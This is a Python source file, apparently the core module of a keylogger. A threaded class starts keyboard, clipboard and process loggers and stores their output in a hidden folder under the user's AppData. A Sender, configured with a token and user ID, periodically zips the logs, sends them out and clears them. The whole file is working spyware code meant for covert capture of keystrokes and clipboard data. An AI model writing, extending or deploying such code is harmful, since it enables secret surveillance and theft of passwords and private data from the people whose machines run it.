from shutil import rmtree
from os import path, mkdir
from getpass import getuser
from threading import Thread

from .modules.sender import Sender
from .loggers.keyboard import KeyboardLogger
from .loggers.clipboard import ClipboardLogger
from .loggers.processes import ProcessesLogger


class Logger(Thread):

    def __init__(self, token: str, user_id: int, keyboard: bool = True, clipboard: bool = True, processes: bool = True, special_keys: bool = False, processes_pause: int = 60, iteration_pause: int = 3600):
        Thread.__init__(self, name="multilogger")

        self.token = token
        self.user_id = user_id
        self.iteration_pause = iteration_pause

        self.user = getuser()
        self.zip_name = f"{self.user}-kl"
        self.storage_path = f"C:/Users/{self.user}/AppData/"
        self.storage_folder = "lgink/"

        self.loggers = (
            {
                "status": keyboard,
                "method": KeyboardLogger(
                    storage_path=self.storage_path,
                    storage_folder=self.storage_folder,
                    special_keys=special_keys
                )
            },
            {
                "status": clipboard,
                "method": ClipboardLogger(
                    storage_path=self.storage_path,
                    storage_folder=self.storage_folder,
                )
            },
            {
                "status": processes,
                "method": ProcessesLogger(
                    storage_path=self.storage_path,
                    storage_folder=self.storage_folder,
                    processes_pause=processes_pause
                ),
            }
        )

    def __create_storage(self):

        if not path.exists(f"{self.storage_path}{self.storage_folder}"):

            mkdir(f"{self.storage_path}{self.storage_folder}")

        else:

            rmtree(f"{self.storage_path}{self.storage_folder}")
            mkdir(f"{self.storage_path}{self.storage_folder}")

    def __clear_logs(self):

        for logger in self.loggers:
            if logger["status"] is True:

                logger["method"].clear()

    def run(self):

        self.__create_storage()

        for logger in self.loggers:
            if logger["status"] is True:

                logger["method"].start()

        Sender(self.zip_name, self.storage_path, self.storage_folder, self.token, self.user_id, self.iteration_pause, self.__clear_logs).start()
